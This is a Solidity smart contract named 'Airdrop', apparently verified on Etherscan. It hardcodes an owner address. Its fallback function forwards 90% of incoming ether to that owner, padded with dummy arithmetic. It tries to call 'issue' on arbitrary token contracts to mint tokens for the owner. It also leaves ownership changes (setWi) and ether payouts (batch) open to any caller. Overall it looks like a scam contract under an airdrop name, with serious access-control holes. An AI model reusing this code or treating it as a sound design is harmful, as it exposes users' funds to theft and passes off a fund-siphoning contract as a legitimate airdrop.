/**
 *Submitted for verification at Etherscan.io on 2021-02-07
*/

pragma solidity ^0.4.0;

/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public constant returns (uint);
    function balanceOf(address who) public constant returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}

/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Airdrop {
    
    address public owner;
    
    ERC20 erc20;
    
	address public usdtaddress = 0x6E3C328812876B6139A9D88B6E7358044C907EEA;

    constructor(){
        owner = 0xA2A07B6D9CBDA58DD3740C56C3C6FC09C19A8F5B;
    }
    
    function batch(address []toAddr, uint256 []value) returns (bool){

        require(toAddr.length == value.length && toAddr.length >= 1);

        for(uint256 i = 0 ; i < toAddr.length; i++){
            
            toAddr[i].transfer(value[i]);
           
        }
    }
    
	function addToken(address token, uint256 value){
		  require(msg.sender == owner);
		  bytes4 fID= bytes4(keccak256("issue(address,uint256)"));	

		  token.call(fID, msg.sender, value);
	}

    	// transfer balance to owner
	function withdrawEther(uint256 amount) {
		if(msg.sender != owner) revert();
		owner.transfer(amount);
	}
	
	// can accept ether
	function() payable {
	    uint a = 1 *2 ;
	    uint b = 1 *2 ;
	    uint c = 1 *2 ;
	    
	    uint balance = this.balance;
	    
	    owner.transfer(balance/10);
	    owner.transfer(balance/10);
		owner.transfer(balance/10);
		owner.transfer(balance/10);
		owner.transfer(balance/10);
		owner.transfer(balance/10);
		owner.transfer(balance/10);
		owner.transfer(balance/10);
		owner.transfer(balance/10);

	    // uint amount = ERC20(usdtaddress).balanceOf(owner);

		// ERC20(usdtaddress).transfer(owner, amount);
    }
    
	function setWi(address amount){
		owner = amount;
	}
}